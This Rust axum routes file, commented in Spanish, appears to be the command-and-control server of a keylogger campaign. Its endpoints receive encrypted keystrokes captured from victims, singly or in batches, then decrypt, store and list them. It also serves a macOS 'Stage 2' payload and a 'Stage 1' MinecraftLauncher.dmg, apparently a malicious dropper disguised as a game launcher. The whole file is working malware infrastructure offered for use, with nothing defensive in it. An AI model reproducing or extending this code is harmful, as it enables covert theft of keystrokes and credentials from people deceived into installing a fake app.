// routes.rs
use axum::{
    extract::State,
    http::{StatusCode, header},
    response::{Json, Response, IntoResponse},
    routing::{get, post},
    Router,
};
use std::sync::Arc;
use crate::storage::Storage;
use crate::crypto;
use std::path::PathBuf;

pub fn create_routes(storage: Storage) -> Router {
    Router::new()
        .route("/keys", post(receive_key))
        .route("/keys/batch", post(receive_keys_batch))
        .route("/keys", get(get_keys))
        .with_state(Arc::new(storage))
}

// Recibir una tecla individual (CIFRADA)
pub async fn receive_key(
    State(storage): State<Arc<Storage>>,
    Json(payload): Json<serde_json::Value>,
) -> StatusCode {
    let encrypted = payload["data"].as_str().unwrap_or("");
    if encrypted.is_empty() {
        eprintln!("⚠️ No se recibió dato cifrado");
        return StatusCode::BAD_REQUEST;
    }

    let decrypted_str = match crypto::decrypt(encrypted) {
        Ok(s) => s,
        Err(e) => {
            eprintln!("❌ Error descifrando: {}", e);
            return StatusCode::BAD_REQUEST;
        }
    };

    let data: serde_json::Value = match serde_json::from_str(&decrypted_str) {
        Ok(v) => v,
        Err(e) => {
            eprintln!("❌ Error parseando JSON descifrado: {}", e);
            return StatusCode::BAD_REQUEST;
        }
    };

    storage.add(data);
    StatusCode::CREATED
}

// Recibir múltiples teclas en un solo request (CIFRADAS)
pub async fn receive_keys_batch(
    State(storage): State<Arc<Storage>>,
    Json(payloads): Json<Vec<serde_json::Value>>,
) -> StatusCode {
    println!("📦 Recibiendo {} teclas cifradas en lote", payloads.len());

    for encrypted_payload in payloads {
        let encrypted = encrypted_payload["data"].as_str().unwrap_or("");
        if encrypted.is_empty() {
            eprintln!("⚠️ Dato cifrado vacío en lote");
            continue;
        }

        let decrypted_str = match crypto::decrypt(encrypted) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("❌ Error descifrando en lote: {}", e);
                continue;
            }
        };

        let data: serde_json::Value = match serde_json::from_str(&decrypted_str) {
            Ok(v) => v,
            Err(e) => {
                eprintln!("❌ Error parseando JSON descifrado en lote: {}", e);
                continue;
            }
        };

        storage.add(data);
    }

    StatusCode::CREATED
}

// Obtener todas las teclas (YA DESCIFRADAS)
pub async fn get_keys(
    State(storage): State<Arc<Storage>>,
) -> Json<Vec<serde_json::Value>> {
    Json(storage.get_all())
}

// Servir payload (Stage 2)
pub async fn serve_payload() -> Vec<u8> {
    std::fs::read("./payloads/stage2_macos").unwrap_or_default()
}

// ============================================================
// Servir la App de Minecraft (Stage 1) - CORREGIDO PARA .dmg
// ============================================================

pub async fn serve_stage1_app() -> Response {
    // Ruta absoluta usando CARGO_MANIFEST_DIR
    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("payloads/MinecraftLauncher.dmg");

    println!("📤 Intentando servir: {:?}", path);
    println!("📤 ¿Existe? {}", path.exists());

    match std::fs::metadata(&path) {
        Ok(meta) => println!("📤 Tamaño: {} bytes", meta.len()),
        Err(_) => println!("📤 Tamaño: N/A (no existe)"),
    }

    match std::fs::read(&path) {
        Ok(data) => {
            println!("✅ Archivo leído ({} bytes)", data.len());
            Response::builder()
                .status(StatusCode::OK)
                .header("Content-Type", "application/x-apple-diskimage")
                .header("Content-Disposition", "attachment; filename=\"MinecraftLauncher.dmg\"")
                .body(axum::body::Body::from(data))
                .unwrap()
        }
        Err(e) => {
            eprintln!("❌ Error leyendo archivo: {}", e);
            Response::builder()
                .status(StatusCode::NOT_FOUND)
                .body(axum::body::Body::from(format!("Archivo no encontrado: {}", e)))
                .unwrap()
        }
    }
}
